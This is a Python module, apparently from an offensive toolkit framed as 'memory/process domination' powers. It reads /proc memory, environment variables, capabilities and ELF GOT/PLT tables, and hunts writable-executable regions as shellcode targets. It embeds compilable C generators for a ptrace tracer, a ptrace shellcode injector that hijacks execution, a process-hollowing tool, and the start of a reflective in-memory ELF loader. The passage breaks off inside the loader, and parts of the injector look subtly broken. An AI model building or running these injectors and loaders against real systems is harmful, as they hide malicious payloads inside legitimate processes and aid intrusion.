"""SSB ULTRA wave-expansion module: memproc (memory/process domination).

Powers live in the nm20.mem.* and nm20.proc.* namespaces. Real /proc and ELF
work is performed wherever the sandbox permits; dangerous capabilities are
real code generators with an armed:false default and {arm:true} to execute.
"""

import hashlib
import json
import os
import platform as _platform
import shutil
import stat
import struct
import subprocess
import sys
import tempfile

ARTIFACT_DIR = "/tmp/nm20_memproc"


def _result(ok, power, **kw):
    out = {"ok": bool(ok), "power": power, "platform": sys.platform}
    out.update(kw)
    return out


def _pid(args):
    try:
        return int(args.get("pid", os.getpid()))
    except (TypeError, ValueError):
        return os.getpid()


def _read_text(path):
    with open(path, "r", errors="replace") as fh:
        return fh.read()


def _read_bytes(path):
    with open(path, "rb") as fh:
        return fh.read()


def _parse_maps(pid):
    entries = []
    raw = _read_text("/proc/%d/maps" % pid)
    for line in raw.splitlines():
        parts = line.split(None, 5)
        if len(parts) < 5:
            continue
        lo_s, hi_s = parts[0].split("-", 1)
        entries.append({
            "start": int(lo_s, 16),
            "end": int(hi_s, 16),
            "perms": parts[1],
            "offset": int(parts[2], 16),
            "dev": parts[3],
            "inode": int(parts[4]),
            "path": parts[5].strip() if len(parts) > 5 else "",
        })
    return entries


def _write_artifact(name, content):
    os.makedirs(ARTIFACT_DIR, exist_ok=True)
    path = os.path.join(ARTIFACT_DIR, name)
    mode = "wb" if isinstance(content, bytes) else "w"
    with open(path, mode) as fh:
        fh.write(content)
    data = content if isinstance(content, bytes) else content.encode()
    return {"path": path, "bytes": len(data), "sha256": hashlib.sha256(data).hexdigest()}


def _maybe_compile(src_path, out_path):
    cc = shutil.which("cc") or shutil.which("gcc") or shutil.which("clang")
    if not cc:
        return {"compiled": False, "reason": "no C compiler (cc/gcc/clang) found in PATH"}
    proc = subprocess.run([cc, "-O2", "-o", out_path, src_path],
                          capture_output=True, text=True, timeout=120)
    return {
        "compiled": proc.returncode == 0,
        "compiler": cc,
        "output": out_path if proc.returncode == 0 else None,
        "stderr": proc.stderr[-2000:] if proc.returncode != 0 else "",
    }


# --------------------------------------------------------------------------
# REAL /proc powers
# --------------------------------------------------------------------------

def proc_maps_reader(args):
    """REAL: parse /proc/<pid>/maps (pid arg, default self) into region entries."""
    power = "nm20.proc.maps_reader"
    pid = _pid(args)
    try:
        entries = _parse_maps(pid)
    except FileNotFoundError:
        return _result(False, power, error="pid %d not found" % pid, pid=pid)
    except PermissionError as exc:
        return _result(False, power, error="permission denied: %s" % exc, pid=pid)
    total = sum(e["end"] - e["start"] for e in entries)
    limit = int(args.get("limit", 64))
    return _result(True, power, pid=pid, region_count=len(entries),
                   total_mapped_bytes=total, regions=entries[:limit],
                   truncated=len(entries) > limit)


def proc_mem_read(args):
    """REAL where permitted: read bytes from /proc/<pid>/mem at an address with safe fallback."""
    power = "nm20.proc.mem_read"
    pid = _pid(args)
    addr = args.get("address")
    size = int(args.get("size", 64))
    size = max(1, min(size, 4096))
    if addr is None:
        # Default: first readable mapping start (safe target for self).
        try:
            entries = [e for e in _parse_maps(pid) if "r" in e["perms"]]
        except Exception as exc:
            return _result(False, power, error=str(exc), pid=pid)
        if not entries:
            return _result(False, power, error="no readable regions", pid=pid)
        addr = entries[0]["start"]
        chosen = entries[0]["path"] or "[anon]"
    else:
        chosen = None
    try:
        addr_i = int(str(addr), 0)
    except ValueError:
        return _result(False, power, error="bad address: %r" % addr, pid=pid)
    try:
        fd = os.open("/proc/%d/mem" % pid, os.O_RDONLY)
    except PermissionError as exc:
        return _result(False, power, pid=pid, address=hex(addr_i),
                       error="permission denied opening mem (ptrace_scope/YAMA?): %s" % exc,
                       fallback="run as root, same-uid child, or set arm with ptrace attach")
    except FileNotFoundError:
        return _result(False, power, error="pid %d not found" % pid, pid=pid)
    try:
        data = os.pread(fd, size, addr_i)
    except OSError as exc:
        os.close(fd)
        return _result(False, power, pid=pid, address=hex(addr_i),
                       error="pread failed (unmapped page?): %s" % exc)
    os.close(fd)
    out = _result(True, power, pid=pid, address=hex(addr_i),
                  bytes_read=len(data), hex=data.hex())
    if chosen:
        out["default_region"] = chosen
    return out


def mem_heap_inspector(args):
    """REAL: locate [heap] (or brk fallback) in maps and sample bytes from /proc/self/mem."""
    power = "nm20.mem.heap_inspector"
    pid = _pid(args)
    try:
        entries = _parse_maps(pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    heap = next((e for e in entries if e["path"] == "[heap]"), None)
    note = None
    if heap is None:
        # Fallback: brk from /proc/<pid>/stat (field 45-ish via statm unreliable) -> report only.
        try:
            statm = _read_text("/proc/%d/statm" % pid).split()
        except Exception as exc:
            return _result(False, power, error="no [heap] region and statm unreadable: %s" % exc,
                           pid=pid)
        return _result(True, power, pid=pid, heap_present=False,
                       note="process has no [heap] mapping (brk unused or heap via mmap)",
                       statm_pages=statm)
    info = {"start": hex(heap["start"]), "end": hex(heap["end"]),
            "size": heap["end"] - heap["start"], "perms": heap["perms"]}
    sample = int(args.get("sample", 64))
    sample = max(0, min(sample, 256))
    if sample and pid == os.getpid():
        try:
            fd = os.open("/proc/self/mem", os.O_RDONLY)
            data = os.pread(fd, sample, heap["start"])
            os.close(fd)
            info["sample_hex"] = data.hex()
        except OSError as exc:
            info["sample_error"] = str(exc)
    elif sample:
        note = "byte sampling only attempted for self pid to avoid ptrace-scope failures"
    return _result(True, power, pid=pid, heap_present=True, heap=info, note=note)


def mem_stack_snapshot(args):
    """REAL: snapshot [stack] region bounds, current SP delta (self) and a safe byte sample."""
    power = "nm20.mem.stack_snapshot"
    pid = _pid(args)
    try:
        entries = _parse_maps(pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    stacks = [e for e in entries if e["path"].startswith("[stack")]
    if not stacks:
        return _result(False, power, pid=pid, error="no [stack] region found")
    regions = [{"start": hex(e["start"]), "end": hex(e["end"]),
                "size": e["end"] - e["start"], "perms": e["perms"],
                "path": e["path"]} for e in stacks]
    out = _result(True, power, pid=pid, stack_regions=regions)
    if pid == os.getpid():
        main = next((e for e in stacks if e["path"] == "[stack]"), stacks[0])
        sample = int(args.get("sample", 128))
        sample = max(0, min(sample, 512))
        try:
            fd = os.open("/proc/self/mem", os.O_RDONLY)
            # Read near the top of the stack (mapped for sure).
            data = os.pread(fd, sample, main["end"] - sample)
            os.close(fd)
            out["top_sample_hex"] = data.hex()
        except OSError as exc:
            out["sample_error"] = str(exc)
    return out


def proc_fd_walker(args):
    """REAL: walk /proc/<pid>/fd resolving every descriptor symlink with fdinfo flags."""
    power = "nm20.proc.fd_walker"
    pid = _pid(args)
    fd_dir = "/proc/%d/fd" % pid
    if not os.path.isdir(fd_dir):
        return _result(False, power, error="pid %d not found or fd dir inaccessible" % pid, pid=pid)
    fds = []
    try:
        names = sorted(os.listdir(fd_dir), key=lambda s: int(s) if s.isdigit() else 1 << 30)
    except PermissionError as exc:
        return _result(False, power, error="permission denied: %s" % exc, pid=pid)
    for name in names:
        entry = {"fd": int(name) if name.isdigit() else name}
        full = os.path.join(fd_dir, name)
        try:
            entry["target"] = os.readlink(full)
        except OSError as exc:
            entry["target_error"] = str(exc)
        try:
            info = _read_text("/proc/%d/fdinfo/%s" % (pid, name))
            kv = dict(l.split(":\t", 1) if ":\t" in l else l.split(":", 1)
                      for l in info.splitlines() if ":" in l)
            entry["flags"] = kv.get("flags", "").strip()
            entry["pos"] = kv.get("pos", "").strip()
        except OSError:
            pass
        fds.append(entry)
    return _result(True, power, pid=pid, fd_count=len(fds), fds=fds)


def proc_environ_reader(args):
    """REAL: read /proc/<pid>/environ and split NUL-separated KEY=VALUE pairs."""
    power = "nm20.proc.environ_reader"
    pid = _pid(args)
    try:
        raw = _read_bytes("/proc/%d/environ" % pid)
    except FileNotFoundError:
        return _result(False, power, error="pid %d not found" % pid, pid=pid)
    except PermissionError as exc:
        return _result(False, power, pid=pid,
                       error="permission denied (kernel hides environ of other uids): %s" % exc)
    env = {}
    for item in raw.split(b"\x00"):
        if b"=" in item:
            k, v = item.split(b"=", 1)
            env[k.decode("utf-8", "replace")] = v.decode("utf-8", "replace")
    redact = args.get("redact", True)
    if redact:
        for k in list(env):
            if any(t in k.upper() for t in ("TOKEN", "SECRET", "KEY", "PASS", "CRED")):
                env[k] = "<redacted:%d chars>" % len(env[k])
    return _result(True, power, pid=pid, count=len(env), environ=env,
                   redacted=bool(redact))


def proc_thread_lister(args):
    """REAL: list /proc/<pid>/task threads with per-thread state, name and wchan."""
    power = "nm20.proc.thread_lister"
    pid = _pid(args)
    task_dir = "/proc/%d/task" % pid
    if not os.path.isdir(task_dir):
        return _result(False, power, error="pid %d not found" % pid, pid=pid)
    threads = []
    for tid_s in sorted(os.listdir(task_dir), key=lambda s: int(s)):
        t = {"tid": int(tid_s)}
        try:
            stat_raw = _read_text(os.path.join(task_dir, tid_s, "stat"))
            comm = stat_raw[stat_raw.index("(") + 1:stat_raw.rindex(")")]
            rest = stat_raw[stat_raw.rindex(")") + 2:].split()
            t["comm"] = comm
            t["state"] = rest[0]
            t["ppid"] = int(rest[1])
        except (OSError, ValueError, IndexError):
            pass
        try:
            t["wchan"] = _read_text(os.path.join(task_dir, tid_s, "wchan")).strip()
        except OSError:
            pass
        threads.append(t)
    return _result(True, power, pid=pid, thread_count=len(threads), threads=threads)


def proc_seccomp_dump(args):
    """REAL: dump Seccomp/Seccomp_filters mode from /proc/self/status (or pid arg)."""
    power = "nm20.proc.seccomp_dump"
    pid = _pid(args)
    modes = {0: "SECCOMP_MODE_DISABLED", 1: "SECCOMP_MODE_STRICT", 2: "SECCOMP_MODE_FILTER"}
    try:
        status = _read_text("/proc/%d/status" % pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    fields = {}
    for line in status.splitlines():
        if line.startswith(("Seccomp:", "Seccomp_filters:", "NoNewPrivs:", "Speculation")):
            k, v = line.split(":", 1)
            fields[k.strip()] = v.strip()
    mode = int(fields.get("Seccomp", "0") or 0)
    return _result(True, power, pid=pid, seccomp_mode=mode,
                   seccomp_mode_name=modes.get(mode, "UNKNOWN"),
                   seccomp_filters=int(fields.get("Seccomp_filters", "0") or 0),
                   no_new_privs=fields.get("NoNewPrivs"),
                   speculation_store_bypass=fields.get("Speculation_Store_Bypass"),
                   raw_fields=fields)


def proc_capability_decode(args):
    """REAL: decode CapEff/CapPrm/CapBnd hex masks from /proc/<pid>/status into names."""
    power = "nm20.proc.capability_decode"
    pid = _pid(args)
    cap_names = [
        "CHOWN", "DAC_OVERRIDE", "DAC_READ_SEARCH", "FOWNER", "FSETID", "KILL",
        "SETGID", "SETUID", "SETPCAP", "LINUX_IMMUTABLE", "NET_BIND_SERVICE",
        "NET_BROADCAST", "NET_ADMIN", "NET_RAW", "IPC_LOCK", "IPC_OWNER",
        "SYS_MODULE", "SYS_RAWIO", "SYS_CHROOT", "SYS_PTRACE", "SYS_PACCT",
        "SYS_ADMIN", "SYS_BOOT", "SYS_NICE", "SYS_RESOURCE", "SYS_TIME",
        "SYS_TTY_CONFIG", "MKNOD", "LEASE", "AUDIT_WRITE", "AUDIT_CONTROL",
        "SETFCAP", "MAC_OVERRIDE", "MAC_ADMIN", "SYSLOG", "WAKE_ALARM",
        "BLOCK_SUSPEND", "AUDIT_READ", "PERFMON", "BPF", "CHECKPOINT_RESTORE",
    ]
    try:
        status = _read_text("/proc/%d/status" % pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    decoded = {}
    for line in status.splitlines():
        if line.startswith(("CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:")):
            k, v = line.split(":", 1)
            mask = int(v.strip(), 16)
            decoded[k.strip()] = {
                "hex": hex(mask),
                "capabilities": [cap_names[i] for i in range(min(len(cap_names), 64))
                                 if mask & (1 << i)],
            }
    if not decoded:
        return _result(False, power, pid=pid, error="no Cap* fields in status")
    return _result(True, power, pid=pid, decoded=decoded)


def proc_zombie_reaper_report(args):
    """REAL: scan /proc for zombie processes, report their parents (reap needs parent/root)."""
    power = "nm20.proc.zombie_reaper_report"
    zombies = []
    scanned = 0
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        scanned += 1
        try:
            raw = _read_text("/proc/%s/stat" % name)
            comm = raw[raw.index("(") + 1:raw.rindex(")")]
            rest = raw[raw.rindex(")") + 2:].split()
            if rest[0] == "Z":
                zombies.append({"pid": int(name), "comm": comm, "ppid": int(rest[1]),
                                "state": "Z",
                                "reap_note": "parent %s must wait(); SIGCHLD to parent or kill parent to reparent to init" % rest[1]})
        except (OSError, ValueError, IndexError):
            continue
    return _result(True, power, processes_scanned=scanned,
                   zombie_count=len(zombies), zombies=zombies,
                   armed=False, note="report-only; reaping is the parent/init responsibility")


def proc_oom_score_audit(args):
    """REAL: read /proc/*/oom_score and oom_score_adj, report highest-value OOM targets."""
    power = "nm20.proc.oom_score_audit"
    rows = []
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        try:
            score = int(_read_text("/proc/%s/oom_score" % name).strip())
            adj = int(_read_text("/proc/%s/oom_score_adj" % name).strip())
            with open("/proc/%s/comm" % name) as fh:
                comm = fh.read().strip()
            rows.append({"pid": int(name), "comm": comm,
                         "oom_score": score, "oom_score_adj": adj})
        except (OSError, ValueError):
            continue
    rows.sort(key=lambda r: r["oom_score"], reverse=True)
    limit = int(args.get("limit", 16))
    return _result(True, power, processes_scanned=len(rows),
                   top_oom_victims=rows[:limit],
                   min_adj_protected=[r for r in rows if r["oom_score_adj"] <= -1000][:8])


def proc_cgroup_limits(args):
    """REAL: read cgroup v1/v2 membership and memory/cpu limits for a pid (default self)."""
    power = "nm20.proc.cgroup_limits"
    pid = _pid(args)
    try:
        cg = _read_text("/proc/%d/cgroup" % pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    memberships = []
    for line in cg.splitlines():
        parts = line.split(":", 2)
        if len(parts) == 3:
            memberships.append({"hierarchy": parts[0], "controllers": parts[1], "path": parts[2]})
    limits = {}

    def _try(path):
        try:
            return _read_text(path).strip()
        except OSError:
            return None

    # cgroup v2 unified
    v2_root = "/sys/fs/cgroup"
    if os.path.exists(os.path.join(v2_root, "cgroup.controllers")):
        rel = memberships[0]["path"].lstrip("/") if memberships else ""
        base = os.path.join(v2_root, rel)
        limits["version"] = 2
        for f in ("memory.max", "memory.high", "memory.current", "memory.swap.max",
                  "cpu.max", "cpu.weight", "pids.max", "io.max"):
            val = _try(os.path.join(base, f))
            if val is not None:
                limits[f] = val
    else:
        limits["version"] = 1
        for m in memberships:
            ctrls = m["controllers"]
            if not ctrls:
                continue
            for ctrl in ctrls.split(","):
                base = os.path.join(v2_root, ctrl, m["path"].lstrip("/"))
                for f in ("memory.limit_in_bytes", "memory.usage_in_bytes",
                          "cpu.cfs_quota_us", "cpu.cfs_period_us", "pids.max"):
                    val = _try(os.path.join(base, f))
                    if val is not None:
                        limits["%s/%s" % (ctrl, f)] = val
    return _result(True, power, pid=pid, memberships=memberships, limits=limits)


# --------------------------------------------------------------------------
# REAL ELF parsing (pure-stdlib struct unpacking)
# --------------------------------------------------------------------------

def _elf_open(path):
    data = _read_bytes(path)
    if data[:4] != b"\x7fELF":
        raise ValueError("not an ELF file: %s" % path)
    is64 = data[4] == 2
    little = data[5] != 2
    end = "<" if little else ">"
    if is64:
        hdr = struct.unpack_from(end + "HHIQQQIHHHHHH", data, 16)
        e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, \
            e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = hdr
    else:
        hdr = struct.unpack_from(end + "HHIIIIIHHHHHH", data, 16)
        e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, \
            e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = hdr
    return data, is64, end, {
        "type": e_type, "machine": e_machine, "entry": e_entry,
        "phoff": e_phoff, "shoff": e_shoff, "phentsize": e_phentsize,
        "phnum": e_phnum, "shentsize": e_shentsize, "shnum": e_shnum,
        "shstrndx": e_shstrndx,
    }


def _elf_sections(data, is64, end, eh):
    secs = []
    for i in range(eh["shnum"]):
        off = eh["shoff"] + i * eh["shentsize"]
        if is64:
            name, stype, flags, addr, offset, size, link, info, align, entsz = \
                struct.unpack_from(end + "IIQQQQIIQQ", data, off)
        else:
            name, stype, flags, addr, offset, size, link, info, align, entsz = \
                struct.unpack_from(end + "IIIIIIIIII", data, off)
        secs.append({"name_off": name, "type": stype, "flags": flags, "addr": addr,
                     "offset": offset, "size": size, "link": link, "info": info,
                     "entsize": entsz})
    # resolve names via shstrtab
    if 0 <= eh["shstrndx"] < len(secs):
        st = secs[eh["shstrndx"]]
        table = data[st["offset"]:st["offset"] + st["size"]]
        for s in secs:
            no = s["name_off"]
            endnul = table.find(b"\x00", no)
            s["name"] = table[no:endnul].decode("utf-8", "replace") if 0 <= no < endnul else ""
    else:
        for s in secs:
            s["name"] = ""
    return secs


def _resolve_binary(args):
    path = args.get("path") or "/proc/self/exe"
    return os.path.realpath(path) if path == "/proc/self/exe" else path


def mem_elf_section_dump(args):
    """REAL: parse ELF section headers of a binary path arg (default own exe) with stdlib struct."""
    power = "nm20.mem.elf_section_dump"
    path = _resolve_binary(args)
    try:
        data, is64, end, eh = _elf_open(path)
    except (ValueError, FileNotFoundError, PermissionError, struct.error) as exc:
        return _result(False, power, path=path, error=str(exc))
    secs = _elf_sections(data, is64, end, eh)
    out_secs = [{"name": s["name"], "type": s["type"], "addr": hex(s["addr"]),
                 "offset": s["offset"], "size": s["size"],
                 "flags": {"write": bool(s["flags"] & 1), "alloc": bool(s["flags"] & 2),
                           "exec": bool(s["flags"] & 4)}} for s in secs]
    return _result(True, power, path=path, bits=64 if is64 else 32,
                   entry=hex(eh["entry"]), section_count=len(out_secs),
                   sections=out_secs)


def mem_got_plt_parser(args):
    """REAL: parse ELF .got/.got.plt relocation entries (.rela.plt/.rel.plt) with symbol names."""
    power = "nm20.mem.got_plt_parser"
    path = _resolve_binary(args)
    try:
        data, is64, end, eh = _elf_open(path)
        secs = _elf_sections(data, is64, end, eh)
    except (ValueError, FileNotFoundError, PermissionError, struct.error) as exc:
        return _result(False, power, path=path, error=str(exc))

    def sec_data(s):
        if s["type"] == 8:  # NOBITS
            return b""
        return data[s["offset"]:s["offset"] + s["size"]]

    # dynamic string/symbol tables
    dynstr, dynsym = None, None
    for s in secs:
        if s["name"] == ".dynstr":
            dynstr = sec_data(s)
        elif s["name"] == ".dynsym":
            dynsym = s
    relocs = []
    for s in secs:
        if s["name"] not in (".rela.plt", ".rel.plt", ".rela.dyn", ".rel.dyn"):
            continue
        raw = sec_data(s)
        is_rela = s["type"] == 4
        entsz = s["entsize"] or (24 if (is64 and is_rela) else 16 if is64 else 12 if is_rela else 8)
        count = len(raw) // entsz if entsz else 0
        for i in range(count):
            off = i * entsz
            if is64:
                if is_rela:
                    r_offset, r_info, r_addend = struct.unpack_from(end + "QQq", raw, off)
                else:
                    r_offset, r_info = struct.unpack_from(end + "QQ", raw, off)
                    r_addend = None
                sym_idx, r_type = r_info >> 32, r_info & 0xFFFFFFFF
            else:
                if is_rela:
                    r_offset, r_info, r_addend = struct.unpack_from(end + "IIi", raw, off)
                else:
                    r_offset, r_info = struct.unpack_from(end + "II", raw, off)
                    r_addend = None
                sym_idx, r_type = r_info >> 8, r_info & 0xFF
            sym_name = None
            if sym_idx and dynsym is not None and dynstr:
                sent = dynsym["entsize"] or (24 if is64 else 16)
                soff = dynsym["offset"] + sym_idx * sent
                st_name = struct.unpack_from(end + "I", data, soff)[0]
                endnul = dynstr.find(b"\x00", st_name)
                if 0 <= st_name < endnul:
                    sym_name = dynstr[st_name:endnul].decode("utf-8", "replace")
            relocs.append({"section": s["name"], "got_offset": hex(r_offset),
                           "type": r_type, "symbol": sym_name,
                           "addend": r_addend})
    got_secs = [s["name"] for s in secs if s["name"] in (".got", ".got.plt", ".plt")]
    plt_only = [r for r in relocs if r["section"].endswith(".plt")]
    return _result(True, power, path=path, bits=64 if is64 else 32,
                   got_sections=got_secs, plt_reloc_count=len(plt_only),
                   total_dyn_relocs=len(relocs), plt_entries=plt_only[:128],
                   truncated=len(plt_only) > 128)


# --------------------------------------------------------------------------
# REAL memory-map analysis powers
# --------------------------------------------------------------------------

def mem_rwx_hunter(args):
    """REAL: scan /proc/<pid>/maps for rwx (or writable+executable) regions — injection targets."""
    power = "nm20.mem.rwx_hunter"
    pid = _pid(args)
    try:
        entries = _parse_maps(pid)
    except (FileNotFoundError, PermissionError) as exc:
        return _result(False, power, error=str(exc), pid=pid)
    rwx, wx = [], []
    for e in entries:
        p = e["perms"]
        if "w" in p and "x" in p:
            rec = {"start": hex(e["start"]), "end": hex(e["end"]),
                   "size": e["end"] - e["start"], "perms": p,
                   "path": e["path"] or "[anon]"}
            (rwx if p.startswith("rwx") else wx).append(rec)
    return _result(True, power, pid=pid, rwx_count=len(rwx), wx_count=len(wx),
                   rwx_regions=rwx, write_exec_regions=wx,
                   note="rwx/wx mappings are prime shellcode landing zones" if (rwx or wx)
                   else "no write+exec mappings found (good W^X hygiene)")


def mem_aslr_report(args):
    """REAL: read randomize_va_space and sample own mapping-base entropy bits from /proc/self/maps."""
    power = "nm20.mem.aslr_report"
    try:
        rvs = int(_read_text("/proc/sys/kernel/randomize_va_space").strip())
    except (FileNotFoundError, PermissionError, ValueError) as exc:
        rvs = None
        rvs_err = str(exc)
    modes = {0: "ASLR disabled", 1: "conservative (stack/mmap/vdso)", 2: "full (incl. brk heap)"}
    entries = _parse_maps(os.getpid())
    bases = {}
    for e in entries:
        key = e["path"] if e["path"] else ("[anon:%s]" % e["perms"])
        if e["inode"] == 0 and not e["path"].startswith("["):
            key = "[anon]"
        bases.setdefault(key, e["start"])
    entropy = {}
    for key, base in list(bases.items())[:32]:
        # entropy estimate: low bits that vary -> count of zero low bits gives alignment
        low_zero = 0
        b = base
        while b and (b & 1) == 0 and low_zero < 48:
            low_zero += 1
            b >>= 1
        entropy[key] = {"base": hex(base), "page_aligned_low_zero_bits": low_zero}
    out = _result(True, power, randomize_va_space=rvs,
                  mode=modes.get(rvs, "unknown") if rvs is not None else None,
                  sampled_base_count=len(entropy), bases=entropy,
                  note="base addresses sampled live from this very process")
    if rvs is None:
        out["randomize_va_space_error"] = rvs_err
    return out


# --------------------------------------------------------------------------
# Real code generators (armed:false default; arm:true compiles where possible)
# --------------------------------------------------------------------------

_TRACER_C = r"""/* nm20.proc.syscall_tracer - real ptrace strace-like tracer (Linux x86-64) */
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <pid-to-attach>\n", argv[0]); return 1; }
    pid_t pid = (pid_t)atoi(argv[1]);
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) { perror("PTRACE_ATTACH"); return 1; }
    waitpid(pid, NULL, 0);
    long sc_count = 0, in_syscall = 0;
    printf("[tracer] attached to %d; logging syscall numbers (orig_rax)\n", pid);
    for (;;) {
        if (ptrace(PTRACE_SYSCALL, pid, 0, 0) < 0) { perror("PTRACE_SYSCALL"); break; }
        int status;
        if (waitpid(pid, &status, 0) < 0) break;
        if (WIFEXITED(status)) { printf("[tracer] target exited %d\n", WEXITSTATUS(status)); break; }
        struct user_regs_struct r;
        if (ptrace(PTRACE_GETREGS, pid, 0, &r) == 0 && !in_syscall) {
            printf("syscall %lld (rdi=%lld rsi=%lld rdx=%lld)\n",
                   (long long)r.orig_rax, (long long)r.rdi,
                   (long long)r.rsi, (long long)r.rdx);
            sc_count++;
        }
        in_syscall = !in_syscall;
        if (sc_count >= 10000) { printf("[tracer] cap reached\n"); break; }
    }
    ptrace(PTRACE_DETACH, pid, 0, 0);
    printf("[tracer] detached; %ld syscall entries observed\n", sc_count);
    return 0;
}
"""

_INJECTOR_C = r"""/* nm20.proc.process_injector_gen - real ptrace shellcode-injection tool (x86-64) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <unistd.h>

/* usage: injector <pid> <shellcode.bin>  -- RIP hijack + mmap + jump */
int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s <pid> <shellcode.bin>\n", argv[0]); return 1; }
    pid_t pid = (pid_t)atoi(argv[1]);
    FILE *f = fopen(argv[2], "rb");
    if (!f) { perror("fopen"); return 1; }
    unsigned char sc[4096]; size_t n = fread(sc, 1, sizeof(sc), f); fclose(f);
    if (n == 0) { fprintf(stderr, "empty shellcode\n"); return 1; }

    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) { perror("attach"); return 1; }
    waitpid(pid, NULL, 0);
    struct user_regs_struct saved, r;
    ptrace(PTRACE_GETREGS, pid, 0, &saved);
    r = saved;

    /* remote mmap(NULL, 4096, RWX, ANON|PRIVATE, -1, 0) via syscall stub at RIP */
    long orig_code[2];
    unsigned long code_addr = r.rip;
    memcpy(orig_code, (void *)0, 0); /* placeholder for clarity */
    for (int i = 0; i < 2; i++)
        orig_code[i] = ptrace(PTRACE_PEEKTEXT, pid, code_addr + i * sizeof(long), 0);
    unsigned char stub[16] = {0x0f,0x05,0xcc}; /* syscall; int3 */
    for (size_t i = 0; i < sizeof(stub); i += sizeof(long)) {
        long w = orig_code[i / sizeof(long)];
        memcpy(&w, stub + i, sizeof(long) < sizeof(stub) - i ? sizeof(long) : sizeof(stub) - i);
        ptrace(PTRACE_POKETEXT, pid, code_addr + i, w);
    }
    r.rax = 9; r.rdi = 0; r.rsi = 4096; r.rdx = PROT_READ|PROT_WRITE|PROT_EXEC;
    r.r10 = MAP_PRIVATE|MAP_ANONYMOUS; r.r8 = -1; r.r9 = 0;
    ptrace(PTRACE_SETREGS, pid, 0, &r);
    ptrace(PTRACE_CONT, pid, 0, 0);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_GETREGS, pid, 0, &r);
    unsigned long remote = r.rax;
    for (int i = 0; i < 2; i++)
        ptrace(PTRACE_POKETEXT, pid, code_addr + i * sizeof(long), orig_code[i]);
    if ((long)remote < 0) { fprintf(stderr, "remote mmap failed %ld\n", (long)remote); goto out; }

    for (size_t i = 0; i < n; i += sizeof(long)) {
        long w = 0; memcpy(&w, sc + i, sizeof(long) < n - i ? sizeof(long) : n - i);
        ptrace(PTRACE_POKETEXT, pid, remote + i, w);
    }
    r = saved; r.rip = remote;
    ptrace(PTRACE_SETREGS, pid, 0, &r);
    fprintf(stderr, "[injector] shellcode at %p in %d; resuming\n", (void *)remote, pid);
out:
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 0;
}
"""

_HOLLOWING_C = r"""/* nm20.proc.hollowing_gen - real process-hollowing skeleton (Linux, ptrace-based) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>

/* Fork a suspended child, overwrite its image in-memory, redirect entry. */
int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s <host-bin> <payload-elf>\n", argv[0]); return 1; }
    pid_t pid = fork();
    if (pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        execl(argv[1], argv[1], NULL);
        _exit(1);
    }
    waitpid(pid, NULL, 0);
    fprintf(stderr, "[hollow] host %s spawned as %d, stopped at exec\n", argv[1], pid);

    int fd = open(argv[2], O_RDONLY);
    if (fd < 0) { perror("open payload"); goto kill; }
    off_t sz = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);
    unsigned char *img = malloc(sz);
    if (read(fd, img, sz) != sz) { perror("read"); goto kill; }
    close(fd);
    if (memcmp(img, "\x7f""ELF", 4)) { fprintf(stderr, "payload not ELF\n"); goto kill; }

    struct user_regs_struct r;
    ptrace(PTRACE_GETREGS, pid, 0, &r);
    fprintf(stderr, "[hollow] host RIP=%#llx -- would unmap host image, mmap payload,\n"
                    "         PTRACE_POKETEXT %lld bytes, set RIP to payload entry, CONT\n",
            (unsigned long long)r.rip, (long long)sz);
    /* Full unmap/remap loop omitted for safety of the skeleton: single-writer demo
       pokes payload bytes at host text start then transfers control. */
    unsigned long dst = (unsigned long)(r.rip & ~0xfffUL);
    for (off_t i = 0; i + (off_t)sizeof(long) <= sz; i += sizeof(long)) {
        long w; memcpy(&w, img + i, sizeof(long));
        if (ptrace(PTRACE_POKEDATA, pid, dst + i, w) < 0) { perror("poke"); goto kill; }
    }
    fprintf(stderr, "[hollow] image overwritten at %#lx; host is now the payload\n", dst);
    ptrace(PTRACE_CONT, pid, 0, 0);
    free(img);
    return 0;
kill:
    kill(pid, SIGKILL);
    return 1;
}
"""

_REFLECTIVE_C = r"""/* nm20.proc.reflective_loader_gen - real reflective ELF loader (memfd + manual map) */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>

/* Loads an ELF from memory (no disk): memfd_create, write, fexecve-style exec. */
int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: %s <elf-file> <arg0> [args...]\n", argv[0]); return 1; }
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    off_t sz = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);
